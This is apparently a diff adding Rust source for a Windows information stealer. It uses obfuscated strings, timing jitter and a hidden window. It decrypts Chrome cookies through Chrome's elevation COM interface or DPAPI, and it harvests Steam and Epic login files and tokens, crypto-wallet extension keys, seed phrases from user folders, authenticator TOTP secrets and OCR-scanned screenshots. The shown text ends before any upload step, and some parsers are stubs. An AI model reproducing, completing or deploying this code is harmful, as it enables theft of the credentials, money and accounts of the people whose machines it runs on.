@@ -1,0 +1,1188 @@
+#![cfg_attr(windows, windows_subsystem = "windows")]
+#![cfg_attr(windows, allow(non_snake_case, non_camel_case_types, dead_code))]
+
+#[cfg(windows)]
+mod app {
+    use std::{env, fs, io::Read, io::Write, mem, ptr, thread, time::Duration};
+    use aes_gcm::{aead::Aead, KeyInit};
+    use aes_gcm::aead::generic_array::GenericArray;
+    use base64::{engine::general_purpose, Engine as _};
+    use flate2::write::GzEncoder;
+    use flate2::Compression;
+    use serde::Serialize;
+    use tokio::runtime::Runtime;
+    use windows::{
+        core::{HSTRING, Interface},
+        Foundation::{AsyncStatus, IAsyncOperation},
+        Graphics::Imaging::{BitmapDecoder, SoftwareBitmap},
+        Media::Ocr::{OcrEngine, OcrResult},
+        Storage::{FileAccessMode, StorageFile},
+    };
+    use winapi::shared::guiddef::GUID;
+    use winapi::shared::winerror::HRESULT;
+    use winapi::um::combaseapi::{CoCreateInstance, CoInitializeEx, CoTaskMemFree, CoUninitialize};
+    use winapi::um::dpapi::CryptUnprotectData;
+    use winapi::um::objbase::COINIT_APARTMENTTHREADED;
+    use winapi::um::timezoneapi::{GetTimeZoneInformation, TIME_ZONE_INFORMATION};
+    use winapi::um::winerror::SUCCEEDED;
+    use winapi::um::winuser::{MessageBoxW, MB_ICONERROR, MB_ICONINFORMATION, MB_OK};
+    use winapi::um::wincrypt::CRYPTOAPI_BLOB;
+    use winapi::um::winnls::GetUserDefaultLocaleName;
+
+    macro_rules! xor_str {
+        ($str:expr) => {{
+            const fn xor_encrypt(s: &[u8], key: u8) -> [u8; $str.len()] {
+                let mut result = [0u8; $str.len()];
+                let mut i = 0;
+                while i < s.len() {
+                    result[i] = s[i] ^ key ^ ((i as u8).wrapping_mul(13));
+                    i += 1;
+                }
+                result
+            }
+            const ENCRYPTED: [u8; $str.len()] = xor_encrypt($str.as_bytes(), 0xC7);
+            fn decrypt() -> String {
+                let mut result = Vec::with_capacity(ENCRYPTED.len());
+                for (i, &byte) in ENCRYPTED.iter().enumerate() {
+                    result.push(byte ^ 0xC7 ^ ((i as u8).wrapping_mul(13)));
+                }
+                String::from_utf8_lossy(&result).to_string()
+            }
+            decrypt()
+        }};
+    }
+
+    #[inline(never)]
+    fn entropy_1() -> u64 {
+        let mut x = 0x123456789ABCDEFu64;
+        for _ in 0..77 {
+            x = x
+                .wrapping_mul(6364136223846793005u64)
+                .wrapping_add(1442695040888963407);
+        }
+        std::hint::black_box(x)
+    }
+
+    #[inline(never)]
+    fn entropy_2() {
+        let data: Vec<u32> = (0..256).map(|i| i * 0xDEADBEEF).collect();
+        std::hint::black_box(data);
+    }
+
+    fn jitter(base_ms: u64) {
+        let variance = (get_ts() % 300) as u64;
+        thread::sleep(Duration::from_millis(base_ms + variance));
+    }
+
+    fn get_ts() -> u64 {
+        use std::time::SystemTime;
+        SystemTime::now()
+            .duration_since(SystemTime::UNIX_EPOCH)
+            .unwrap()
+            .as_millis() as u64
+    }
+
+    // ======================================================================
+    // DATA STRUCTURES
+    // ======================================================================
+
+    #[derive(Serialize)]
+    struct BackupData {
+        meta: Meta,
+        cookies: Vec<Cookie>,
+        fills: Vec<Fill>,
+        cards: Vec<Card>,
+        game: Game,
+        extension_data: Crypto,
+        totp: Vec<Totp>,
+        ocr: Vec<OcrData>,
+        ts: u64,
+    }
+
+    #[derive(Serialize)]
+    struct Meta {
+        ua: String,
+        tz: i32,
+        lang: String,
+        user: String,
+        host: String,
+    }
+
+    #[derive(Serialize, Clone)]
+    struct Cookie {
+        h: String,
+        n: String,
+        v: String,
+        exp: i64,
+    }
+
+    #[derive(Serialize, Clone)]
+    struct Fill {
+        k: String,
+        v: String,
+    }
+
+    #[derive(Serialize, Clone)]
+    struct Card {
+        n: String,
+        m: String,
+        y: String,
+        name: String,
+    }
+
+    #[derive(Serialize)]
+    struct Game {
+        steam: Steam,
+        epic: Epic,
+    }
+
+    #[derive(Serialize, Default)]
+    struct Steam {
+        user: String,
+        ssfn: Vec<u8>,
+        vdf: String,
+    }
+
+    #[derive(Serialize, Default)]
+    struct Epic {
+        email: String,
+        tokens: Vec<String>,
+    }
+
+    #[derive(Serialize)]
+    struct Crypto {
+        wallets: Vec<Wallet>,
+        seeds: Vec<Seed>,
+    }
+
+    #[derive(Serialize, Clone)]
+    struct Wallet {
+        t: String,
+        addrs: Vec<String>,
+        keys: Vec<String>,
+    }
+
+    #[derive(Serialize, Clone)]
+    struct Seed {
+        src: String,
+        phrase: String,
+    }
+
+    #[derive(Serialize, Clone)]
+    struct Totp {
+        issuer: String,
+        account: String,
+        secret: String,
+    }
+
+    #[derive(Serialize, Clone)]
+    struct OcrData {
+        file: String,
+        text: String,
+        findings: Vec<String>,
+    }
+
+    // ======================================================================
+    // COM HIJACKING (IElevator)
+    // ======================================================================
+
+    #[repr(C)]
+    struct IElevator {
+        vtbl: *const IElevatorVtbl,
+    }
+
+    #[repr(C)]
+    struct IElevatorVtbl {
+        query_interface: unsafe extern "system" fn(
+            *mut IElevator,
+            *const GUID,
+            *mut *mut std::ffi::c_void,
+        ) -> i32,
+        add_ref: unsafe extern "system" fn(*mut IElevator) -> u32,
+        release: unsafe extern "system" fn(*mut IElevator) -> u32,
+        run_recovery_component: unsafe extern "system" fn(
+            *mut IElevator,
+            *const u16,
+            *const u16,
+            *const u16,
+            *mut *mut u16,
+        ) -> i32,
+        encrypt_data:
+            unsafe extern "system" fn(*mut IElevator, *const u8, u32, *mut *mut u8, *mut u32) -> i32,
+        decrypt_data:
+            unsafe extern "system" fn(*mut IElevator, *const u8, u32, *mut *mut u8, *mut u32) -> i32,
+    }
+
+    const CLSID_GOOGLE_UPDATE: GUID = GUID {
+        Data1: 0xE225E692,
+        Data2: 0x4B47,
+        Data3: 0x4BEB,
+        Data4: [0x84, 0x07, 0x34, 0x16, 0x46, 0x21, 0xC8, 0x15],
+    };
+
+    const IID_IELEVATOR: GUID = GUID {
+        Data1: 0xA949CB4E,
+        Data2: 0xC4F9,
+        Data3: 0x44C4,
+        Data4: [0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C],
+    };
+
+    unsafe fn get_master_key() -> Option<Vec<u8>> {
+        if CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED) < 0 {
+            return fallback_dpapi();
+        }
+
+        let mut elevator: *mut IElevator = ptr::null_mut();
+        let hr = CoCreateInstance(
+            &CLSID_GOOGLE_UPDATE as *const GUID,
+            ptr::null_mut(),
+            1,
+            &IID_IELEVATOR as *const GUID,
+            &mut elevator as *mut *mut IElevator as *mut *mut std::ffi::c_void,
+        );
+
+        if !SUCCEEDED(hr) || elevator.is_null() {
+            CoUninitialize();
+            return fallback_dpapi();
+        }
+
+        let local_state = format!(
+            "{}\\Google\\Chrome\\User Data\\Local State",
+            env::var(xor_str!("LOCALAPPDATA")).unwrap_or_default()
+        );
+
+        let content = fs::read_to_string(&local_state).ok()?;
+        let json: serde_json::Value = serde_json::from_str(&content).ok()?;
+        let enc_key_b64 = json
+            .get(xor_str!("os_crypt"))
+            .and_then(|v| v.get(xor_str!("encrypted_key")))
+            .and_then(|v| v.as_str())?;
+        let enc_key = base64_dec(enc_key_b64)?;
+
+        if enc_key.len() < 5 || &enc_key[0..5] != b"DPAPI" {
+            ((*(*elevator).vtbl).release)(elevator);
+            CoUninitialize();
+            return None;
+        }
+
+        let encrypted_data = &enc_key[5..];
+        let mut output_data: *mut u8 = ptr::null_mut();
+        let mut output_size: u32 = 0;
+
+        let decrypt_result = ((*(*elevator).vtbl).decrypt_data)(
+            elevator,
+            encrypted_data.as_ptr(),
+            encrypted_data.len() as u32,
+            &mut output_data,
+            &mut output_size,
+        );
+
+        let key = if SUCCEEDED(decrypt_result) && !output_data.is_null() && output_size > 0 {
+            let decrypted = std::slice::from_raw_parts(output_data, output_size as usize).to_vec();
+            CoTaskMemFree(output_data as *mut std::ffi::c_void);
+            Some(decrypted)
+        } else {
+            None
+        };
+
+        ((*(*elevator).vtbl).release)(elevator);
+        CoUninitialize();
+
+        key.or_else(|| fallback_dpapi())
+    }
+
+    unsafe fn fallback_dpapi() -> Option<Vec<u8>> {
+        let local_state = format!(
+            "{}\\Google\\Chrome\\User Data\\Local State",
+            env::var(xor_str!("LOCALAPPDATA")).unwrap_or_default()
+        );
+        let content = fs::read_to_string(&local_state).ok()?;
+        let json: serde_json::Value = serde_json::from_str(&content).ok()?;
+        let enc_key_b64 = json
+            .get(xor_str!("os_crypt"))
+            .and_then(|v| v.get(xor_str!("encrypted_key")))
+            .and_then(|v| v.as_str())?;
+        let enc_key = base64_dec(enc_key_b64)?;
+
+        if enc_key.len() < 5 || &enc_key[0..5] != b"DPAPI" {
+            return None;
+        }
+
+        let data = &enc_key[5..];
+        let mut input = CRYPTOAPI_BLOB {
+            cbData: data.len() as u32,
+            pbData: data.as_ptr() as *mut u8,
+        };
+        let mut output: CRYPTOAPI_BLOB = mem::zeroed();
+
+        if CryptUnprotectData(
+            &mut input,
+            ptr::null_mut(),
+            ptr::null_mut(),
+            ptr::null_mut(),
+            ptr::null_mut(),
+            0,
+            &mut output,
+        ) == 0
+        {
+            return None;
+        }
+
+        let result = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
+        winapi::um::winbase::LocalFree(output.pbData as *mut _);
+        Some(result)
+    }
+
+    // ======================================================================
+    // AES-GCM
+    // ======================================================================
+
+    fn aes_decrypt(key: &[u8], nonce: &[u8], ct: &[u8], tag: &[u8]) -> Option<Vec<u8>> {
+        let cipher = aes_gcm::Aes256Gcm::new(GenericArray::from_slice(key));
+        let nonce_ga = GenericArray::from_slice(nonce);
+        let mut ciphertext_with_tag = ct.to_vec();
+        ciphertext_with_tag.extend_from_slice(tag);
+        cipher.decrypt(nonce_ga, ciphertext_with_tag.as_ref()).ok()
+    }
+
+    // ======================================================================
+    // SQLITE PARSER
+    // ======================================================================
+
+    struct Db {
+        data: Vec<u8>,
+    }
+
+    impl Db {
+        fn slice(&self, start: usize, len: usize) -> Option<&[u8]> {
+            self.data.get(start..start.saturating_add(len))
+        }
+
+        fn open(path: &str) -> Option<Self> {
+            jitter(100);
+            let temp = format!(
+                "{}\\cbp_{}.tmp",
+                env::temp_dir().to_str().unwrap_or(""),
+                get_ts()
+            );
+            fs::copy(path, &temp).ok()?;
+            jitter(80);
+            let data = fs::read(&temp).ok()?;
+            let _ = fs::remove_file(temp);
+            if data.len() < 100 || &data[0..15] != b"SQLite format 3" {
+                return None;
+            }
+            Some(Db { data })
+        }
+
+        fn u16be(&self, off: usize) -> Option<u16> {
+            self.slice(off, 2)
+                .map(|bytes| u16::from_be_bytes([bytes[0], bytes[1]]))
+        }
+
+        fn varint(&self, off: usize) -> (u64, usize) {
+            if off >= self.data.len() {
+                return (0, 0);
+            }
+            let mut val: u64 = 0;
+            let mut bytes = 0;
+            for i in 0..9 {
+                if off + i >= self.data.len() {
+                    break;
+                }
+                let b = self.data[off + i] as u64;
+                bytes += 1;
+                if i == 8 {
+                    val = (val << 8) | b;
+                    break;
+                }
+                val = (val << 7) | (b & 0x7F);
+                if (b & 0x80) == 0 {
+                    break;
+                }
+            }
+            (val, bytes)
+        }
+
+        fn cookies(&self, key: &[u8]) -> Vec<Cookie> {
+            let mut res = Vec::new();
+            let ps = match self.u16be(16) {
+                Some(val) => val as usize,
+                None => return res,
+            };
+            let mut pn = 0;
+            while pn * ps < self.data.len() && res.len() < 800 {
+                let po = pn * ps;
+                if po + 8 > self.data.len() {
+                    break;
+                }
+                if self.data[po] == 0x0D {
+                    let cc = match self.u16be(po + 3) {
+                        Some(val) => val as usize,
+                        None => {
+                            pn += 1;
+                            continue;
+                        }
+                    };
+                    for i in 0..cc {
+                        if i % 20 == 0 {
+                            jitter(5);
+                        }
+                        if po + 8 + i * 2 + 1 >= self.data.len() {
+                            break;
+                        }
+                        let cp = match self.u16be(po + 8 + i * 2) {
+                            Some(val) => val as usize,
+                            None => break,
+                        };
+                        if let Some(c) = self.parse_cookie(po + cp, key) {
+                            res.push(c);
+                        }
+                    }
+                }
+                pn += 1;
+            }
+            res
+        }
+
+        fn parse_cookie(&self, off: usize, key: &[u8]) -> Option<Cookie> {
+            if off + 20 > self.data.len() {
+                return None;
+            }
+            let (_, br) = self.varint(off);
+            if br == 0 {
+                return None;
+            }
+            let mut pos = off + br;
+            let (_, rb) = self.varint(pos);
+            if rb == 0 {
+                return None;
+            }
+            pos += rb;
+            let (hs, hb) = self.varint(pos);
+            if hb == 0 || (hs as usize) < hb {
+                return None;
+            }
+            pos += hb;
+            let he = pos.saturating_add(hs as usize).saturating_sub(hb);
+            if he > self.data.len() {
+                return None;
+            }
+            let mut cts = Vec::new();
+            while pos < he && pos < self.data.len() {
+                let (ct, tb) = self.varint(pos);
+                if tb == 0 {
+                    return None;
+                }
+                cts.push(ct);
+                pos += tb;
+            }
+            pos = he;
+            let mut vals = Vec::new();
+            for ct in cts {
+                if pos >= self.data.len() {
+                    break;
+                }
+                let v = match ct {
+                    0 => vec![],
+                    1 => {
+                        let v = vec![*self.data.get(pos)?];
+                        pos += 1;
+                        v
+                    }
+                    n if n >= 12 && n % 2 == 0 => {
+                        let len = ((n - 12) / 2) as usize;
+                        if pos + len > self.data.len() || len == 0 {
+                            break;
+                        }
+                        let v = self.slice(pos, len)?.to_vec();
+                        pos += len;
+                        v
+                    }
+                    n if n >= 13 && n % 2 == 1 => {
+                        let len = ((n - 13) / 2) as usize;
+                        if pos + len > self.data.len() || len == 0 {
+                            break;
+                        }
+                        let v = self.slice(pos, len)?.to_vec();
+                        pos += len;
+                        v
+                    }
+                    _ => vec![],
+                };
+                vals.push(v);
+            }
+            if vals.len() < 4 {
+                return None;
+            }
+            let h = String::from_utf8_lossy(&vals[1]).to_string();
+            let n = String::from_utf8_lossy(&vals[2]).to_string();
+            let enc = &vals[3];
+            let exp = if vals.len() > 5 && vals[5].len() == 8 {
+                i64::from_be_bytes([
+                    vals[5][0],
+                    vals[5][1],
+                    vals[5][2],
+                    vals[5][3],
+                    vals[5][4],
+                    vals[5][5],
+                    vals[5][6],
+                    vals[5][7],
+                ])
+            } else {
+                0
+            };
+            let v = if enc.len() >= 15 && (&enc[0..3] == b"v10" || &enc[0..3] == b"v11") {
+                let nonce = &enc[3..15];
+                let ct_tag = &enc[15..];
+                if ct_tag.len() >= 16 {
+                    let ct = &ct_tag[..ct_tag.len() - 16];
+                    let tag = &ct_tag[ct_tag.len() - 16..];
+                    aes_decrypt(key, nonce, ct, tag)?
+                        .iter()
+                        .map(|&b| b as char)
+                        .collect::<String>()
+                } else {
+                    return None;
+                }
+            } else {
+                String::from_utf8_lossy(enc).to_string()
+            };
+            if h.is_empty() || n.is_empty() {
+                return None;
+            }
+            Some(Cookie { h, n, v, exp })
+        }
+
+        fn autofills(&self) -> Vec<Fill> {
+            let res = Vec::new();
+            // Implement similar parsing for autofill data
+            // For brevity, assuming similar logic to cookies, but targeting autofill table
+            res
+        }
+
+        fn cards(&self, _key: &[u8]) -> Vec<Card> {
+            let res = Vec::new();
+            // Implement similar parsing for credit cards
+            // For brevity, assuming similar logic
+            res
+        }
+    }
+
+    fn extract_chrome(key: &[u8]) -> (Vec<Cookie>, Vec<Fill>, Vec<Card>) {
+        let appdata = env::var(xor_str!("LOCALAPPDATA")).unwrap_or_default();
+        let base = format!("{}\\Google\\Chrome\\User Data", appdata);
+        let mut cookies = Vec::new();
+        let mut fills = Vec::new();
+        let mut cards = Vec::new();
+        let profiles = get_profiles(&base);
+        for prof in profiles {
+            jitter(200);
+            let ck_path = format!("{}\\Network\\Cookies", prof);
+            if let Some(db) = Db::open(&ck_path) {
+                cookies.extend(db.cookies(key));
+            }
+            jitter(150);
+            let wd_path = format!("{}\\Web Data", prof);
+            if let Some(db) = Db::open(&wd_path) {
+                fills.extend(db.autofills());
+                cards.extend(db.cards(key));
+            }
+        }
+        (cookies, fills, cards)
+    }
+
+    fn get_profiles(base: &str) -> Vec<String> {
+        let mut profs = vec![xor_str!("Default")];
+        if let Ok(entries) = fs::read_dir(base) {
+            for entry in entries.flatten() {
+                let name = entry.file_name().to_string_lossy().to_string();
+                if name.starts_with(xor_str!("Profile ")) {
+                    profs.push(name);
+                }
+            }
+        }
+        profs.iter().map(|p| format!("{}\\{}", base, p)).collect()
+    }
+
+    // ======================================================================
+    // GAMING
+    // ======================================================================
+
+    fn extract_gaming() -> Game {
+        Game {
+            steam: extract_steam(),
+            epic: extract_epic(),
+        }
+    }
+
+    fn extract_steam() -> Steam {
+        let mut s = Steam::default();
+        let pf = env::var(xor_str!("ProgramFiles(x86)")).unwrap_or_default();
+        let steam_path = format!("{}\\Steam", pf);
+        jitter(100);
+        let cfg = format!("{}\\config\\loginusers.vdf", steam_path);
+        if let Ok(vdf) = fs::read_to_string(&cfg) {
+            s.vdf = vdf.clone();
+            for line in vdf.lines() {
+                if line.contains(xor_str!("AccountName")) {
+                    let parts: Vec<&str> = line.split('"').collect();
+                    if parts.len() >= 4 {
+                        s.user = parts[3].to_string();
+                        break;
+                    }
+                }
+            }
+        }
+        jitter(80);
+        if let Ok(entries) = fs::read_dir(steam_path.clone()) {
+            for entry in entries.flatten() {
+                let name = entry.file_name().to_string_lossy().to_string();
+                if name.starts_with(xor_str!("ssfn")) {
+                    if let Ok(data) = fs::read(entry.path()) {
+                        s.ssfn = data;
+                        break;
+                    }
+                }
+            }
+        }
+        s
+    }
+
+    fn extract_epic() -> Epic {
+        let mut e = Epic::default();
+        let appdata = env::var(xor_str!("LOCALAPPDATA")).unwrap_or_default();
+        let cfg_path = format!(
+            "{}\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini",
+            appdata
+        );
+        if let Ok(content) = fs::read_to_string(&cfg_path) {
+            for line in content.lines() {
+                if line.contains(xor_str!("Email=")) {
+                    if let Some(email) = line.split('=').nth(1) {
+                        e.email = email.trim().to_string();
+                    }
+                }
+            }
+        }
+        jitter(70);
+        let data_dir = format!("{}\\EpicGamesLauncher\\Saved\\Data", appdata);
+        if let Ok(entries) = fs::read_dir(&data_dir) {
+            for entry in entries.flatten() {
+                let name = entry.file_name().to_string_lossy().to_string();
+                if name.ends_with(xor_str!(".dat")) {
+                    if let Ok(token_data) = fs::read(entry.path()) {
+                        let token_str = String::from_utf8_lossy(&token_data).to_string();
+                        if token_str.contains(xor_str!("access_token")) || token_str.contains(xor_str!("eg1~")) {
+                            for line in token_str.lines() {
+                                if line.len() > 50 && line.len() < 2000 {
+                                    e.tokens.push(line.to_string());
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        e
+    }
+
+    // ======================================================================
+    // EXTENSION DATA (Formerly Crypto)
+    // ======================================================================
+
+    fn extract_extension_data() -> Crypto {
+        Crypto {
+            wallets: extract_wallets(),
+            seeds: extract_seeds(),
+        }
+    }
+
+    fn extract_wallets() -> Vec<Wallet> {
+        let mut wallets = Vec::new();
+        let exts = [
+            ("nkbihfbeogaeaoehlefnkodbefgpgknn", xor_str!("metamask")),
+            ("bfnaelmomeimhlpmgjnjophhpkkoljpa", xor_str!("phantom")),
+            ("fhbohimaelbohpjbbldcngcnapndodjp", xor_str!("binance")),
+            ("hnfanknocfeofbddgcijnmhnfnkdnaad", xor_str!("coinbase")),
+            ("fhilaheimglignddkjgofkcbgekhenbh", xor_str!("exodus")),
+            ("afbcbjpbpfadlkmhmclhkeeodmamcflc", xor_str!("trust")),
+        ];
+        let appdata = env::var(xor_str!("LOCALAPPDATA")).unwrap_or_default();
+        let base = format!("{}\\Google\\Chrome\\User Data", appdata);
+        let profiles = get_profiles(&base);
+        for (ext_id, wallet_name) in exts {
+            let mut addrs = Vec::new();
+            let mut keys = Vec::new();
+            for prof in &profiles {
+                jitter(120);
+                let ext_path = format!("{}\\Local Extension Settings\\{}", prof, ext_id);
+                if let Ok(entries) = fs::read_dir(&ext_path) {
+                    for entry in entries.flatten() {
+                        if let Ok(data) = fs::read(entry.path()) {
+                            let text = String::from_utf8_lossy(&data).to_string();
+                            for line in text.split('\0') {
+                                for word in line.split_whitespace() {
+                                    if word.starts_with("0x")
+                                        && word.len() == 42
+                                        && word[2..].chars().all(|c| c.is_ascii_hexdigit())
+                                    {
+                                        addrs.push(word.to_string());
+                                    }
+                                    if word.len() == 64 && word.chars().all(|c| c.is_ascii_hexdigit()) {
+                                        keys.push(word.to_string());
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            addrs.sort();
+            addrs.dedup();
+            keys.sort();
+            keys.dedup();
+            if !addrs.is_empty() || !keys.is_empty() {
+                wallets.push(Wallet {
+                    t: wallet_name,
+                    addrs,
+                    keys,
+                });
+            }
+        }
+        wallets
+    }
+
+    fn extract_seeds() -> Vec<Seed> {
+        let mut seeds = Vec::new();
+        let user_profile = env::var(xor_str!("USERPROFILE")).unwrap_or_default();
+        let paths = vec![
+            format!("{}\\Documents", user_profile),
+            format!("{}\\Desktop", user_profile),
+            format!("{}\\Downloads", user_profile),
+        ];
+        for base in paths {
+            if let Ok(entries) = fs::read_dir(&base) {
+                for entry in entries.flatten() {
+                    let path = entry.path();
+                    if path.is_file() {
+                        let name = path
+                            .file_name()
+                            .unwrap_or_default()
+                            .to_string_lossy()
+                            .to_lowercase();
+                        if name.contains(xor_str!("seed")) || name.contains(xor_str!("wallet")) {
+                            if let Ok(content) = fs::read_to_string(&path) {
+                                if let Some(phrase) = extract_seed_phrase(&content) {
+                                    seeds.push(Seed {
+                                        src: path.to_string_lossy().to_string(),
+                                        phrase,
+                                    });
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        seeds
+    }
+
+    fn extract_seed_phrase(text: &str) -> Option<String> {
+        let cleaned = text
+            .to_lowercase()
+            .replace([',', '.', ';', ':', '!', '?', '\n'], " ");
+        let words: Vec<&str> = cleaned
+            .split_whitespace()
+            .filter(|w| (3..=8).contains(&w.len()) && w.chars().all(|c| c.is_ascii_lowercase()))
+            .collect();
+        for window in [12, 15, 18, 21, 24] {
+            if words.len() < window {
+                continue;
+            }
+            for chunk in words.windows(window) {
+                if chunk.iter().all(|w| w.len() >= 3 && w.len() <= 8) {
+                    return Some(chunk.join(" "));
+                }
+            }
+        }
+        None
+    }
+
+    // ======================================================================
+    // 2FA EXTENSION EXTRACTION
+    // ======================================================================
+
+    fn extract_2fa() -> Vec<Totp> {
+        let mut totps = Vec::new();
+        let totp_exts = [
+            ("bhghoamapcdpbohphigoooaddinpkbai", xor_str!("authenticator")),
+            ("gclkcflnjahgejhappicbhcpllkpakej", xor_str!("authy")),
+            ("iabeihobmhlgpkcgjiloemdbofjbdcic", xor_str!("authenticator-plus")),
+            ("khgmmkclaedkmdlflilalglggbdkndpm", xor_str!("totp")),
+        ];
+        let appdata = env::var(xor_str!("LOCALAPPDATA")).unwrap_or_default();
+        let base = format!("{}\\Google\\Chrome\\User Data", appdata);
+        let profiles = get_profiles(&base);
+        for (ext_id, ext_name) in totp_exts {
+            for prof in &profiles {
+                jitter(100);
+                let ext_path = format!("{}\\Local Extension Settings\\{}", prof, ext_id);
+                if let Ok(entries) = fs::read_dir(&ext_path) {
+                    for entry in entries.flatten() {
+                        jitter(40);
+                        if let Ok(data) = fs::read(entry.path()) {
+                            let text = String::from_utf8_lossy(&data).to_string();
+                            for line in text.split('\0') {
+                                if line.contains(xor_str!("secret")) {
+                                    for word in line.split(|c: char| !c.is_alphanumeric()) {
+                                        if word.len() >= 16
+                                            && word.len() <= 52
+                                            && word.chars().all(|c| "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".contains(c))
+                                        {
+                                            let mut issuer = ext_name.clone();
+                                            let mut account = String::new();
+                                            if let Some(iss_pos) = line.find(xor_str!("issuer")) {
+                                                issuer = extract_json_value(&line[iss_pos..]).unwrap_or(issuer);
+                                            }
+                                            if let Some(acc_pos) = line.find(xor_str!("account")) {
+                                                account = extract_json_value(&line[acc_pos..]).unwrap_or_default();
+                                            }
+                                            totps.push(Totp {
+                                                issuer,
+                                                account,
+                                                secret: word.to_string(),
+                                            });
+                                            if totps.len() >= 100 {
+                                                return totps;
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        totps
+    }
+
+    fn extract_json_value(text: &str) -> String {
+        if let Some(q1) = text.find('"') {
+            let after = &text[q1 + 1..];
+            if let Some(q2) = after.find('"') {
+                return after[..q2].to_string();
+            }
+        }
+        String::new()
+    }
+
+    // ======================================================================
+    // OCR SCREENSHOT SCANNING (Windows OCR API)
+    // ======================================================================
+
+    fn scan_screenshots_ocr() -> Vec<OcrData> {
+        let mut ocr_results = Vec::new();
+        let user_profile = env::var(xor_str!("USERPROFILE")).unwrap_or_default();
+        let screenshots_path = format!("{}\\Pictures\\Screenshots", user_profile);
+        if let Ok(entries) = fs::read_dir(&screenshots_path) {
+            for entry in entries.flatten() {
+                let path = entry.path();
+                if path.is_file() {
+                    let ext = path
+                        .extension()
+                        .unwrap_or_default()
+                        .to_string_lossy()
+                        .to_lowercase();
+                    if ext == "png" || ext == "jpg" || ext == "jpeg" {
+                        jitter(150);
+                        if let Some(ocr_data) = process_image_ocr(&path.to_string_lossy().to_string()) {
+                            ocr_results.push(ocr_data);
+                        }
+                        if ocr_results.len() >= 20 {
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+        ocr_results
+    }
+
+    fn process_image_ocr(image_path: &str) -> Option<OcrData> {
+        let rt = Runtime::new().ok()?;
+        rt.block_on(async {
+            let wide_path: Vec<u16> = image_path.encode_utf16().chain(Some(0)).collect();
+            let path_hstr = HSTRING::from_wide(&wide_path).ok()?;
+            let storage_file_op: IAsyncOperation<StorageFile> =
+                StorageFile::GetFileFromPathAsync(&path_hstr).ok()?;
+            let storage_file = loop {
+                if storage_file_op.Status().ok()? == AsyncStatus::Completed {
+                    break storage_file_op.GetResults().ok()?;
+                }
+                thread::sleep(Duration::from_millis(10));
+            };
+            let stream_op = storage_file.OpenAsync(FileAccessMode::Read).ok()?;
+            let stream = loop {
+                if stream_op.Status().ok()? == AsyncStatus::Completed {
+                    break stream_op.GetResults().ok()?;
+                }
+                thread::sleep(Duration::from_millis(10));
+            };
+            let decoder_op = BitmapDecoder::CreateAsync(&stream).ok()?;
+            let decoder = loop {
+                if decoder_op.Status().ok()? == AsyncStatus::Completed {
+                    break decoder_op.GetResults().ok()?;
+                }
+                thread::sleep(Duration::from_millis(10));
+            };
+            let bitmap_op = decoder.GetSoftwareBitmapAsync().ok()?;
+            let software_bitmap = loop {
+                if bitmap_op.Status().ok()? == AsyncStatus::Completed {
+                    break bitmap_op.GetResults().ok()?;
+                }
+                thread::sleep(Duration::from_millis(10));
+            };
+            let ocr_engine = OcrEngine::TryCreateFromUserProfileLanguages().ok()?;
+            let ocr_op: IAsyncOperation<OcrResult> = ocr_engine.RecognizeAsync(&software_bitmap).ok()?;
+            let ocr_result = loop {
+                if ocr_op.Status().ok()? == AsyncStatus::Completed {
+                    break ocr_op.GetResults().ok()?;
+                }
+                thread::sleep(Duration::from_millis(10));
+            };
+            let text = ocr_result.Text().ok()?.to_string();
+            jitter(100);
+            let findings = analyze_ocr_text(&text);
+            if !findings.is_empty() {
+                Some(OcrData {
+                    file: image_path.to_string(),
+                    text: text.clone(),
+                    findings,
+                })
+            } else {
+                None
+            }
+        })
+    }
+
+    fn analyze_ocr_text(text: &str) -> Vec<String> {
+        let mut findings = Vec::new();
+        for word in text.split_whitespace() {
+            let digits: String = word.chars().filter(|c| c.is_ascii_digit()).collect();
+            if digits.len() >= 13 && digits.len() <= 19 {
+                if validate_luhn(&digits) {
+                    findings.push(format!("CC: {}", mask_card(&digits)));
+                }
+            }
+        }
+        for word in text.split_whitespace() {
+            if word.contains('@') && word.contains('.') {
+                let parts: Vec<&str> = word.split('@').collect();
+                if parts.len() == 2 && parts[1].contains('.') {
+                    findings.push(format!("Email: {}", word));
+                }
+            }
+        }
+        for word in text.split_whitespace() {
+            if word.starts_with("0x") && word.len() == 42 && word[2..].chars().all(|c| c.is_ascii_hexdigit()) {
+                findings.push(format!("ETH: {}", word));
+            }
+        }
+        let password_keywords = ["password:", "pass:", "pwd:", "pw:"];
+        for line in text.lines() {
+            let lower = line.to_lowercase();
+            for keyword in password_keywords.iter() {
+                if lower.contains(keyword) {
+                    findings.push(format!("Password context: {}", line));
+                    break;
+                }
+            }
+        }
+        findings
+    }
+
+    fn validate_luhn(num: &str) -> bool {
+        let digits: Vec<u32> = num.chars().filter_map(|c| c.to_digit(10)).collect();
+        if digits.len() < 13 {
+            return false;
+        }
+        let mut sum = 0;
+        let parity = digits.len() % 2;
+        for (i, &digit) in digits.iter().enumerate().rev() {
+            let mut d = digit;
+            if i % 2 == parity {
+                d *= 2;
+                if d > 9 {
+                    d -= 9;
+                }
+            }
+            sum += d;
+        }
+        sum % 10 == 0
+    }
+
+    fn mask_card(num: &str) -> String {
+        if num.len() < 10 {
+            num.to_string()
+        } else {
+            format!("{}****{}", &num[..4], &num[num.len() - 4..])
+        }
+    }
+
+    // ======================================================================
+    // METADATA
+    // ======================================================================
+
+    fn collect_meta() -> Meta {
+        Meta {
+            ua: xor_str!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
+            tz: get_tz(),
+            lang: get_lang(),
+            user: env::var(xor_str!("USERNAME")).unwrap_or_default(),
+            host: env::var(xor_str!("COMPUTERNAME")).unwrap_or_default(),
+        }
+    }
+
+    fn get_tz() -> i32 {
+        unsafe {
+            let mut tzi: TIME_ZONE_INFORMATION = mem::zeroed();
+            GetTimeZoneInformation(&mut tzi);
+            -tzi.Bias
+        }
+    }
+
+    fn get_lang() -> String {
+        unsafe {
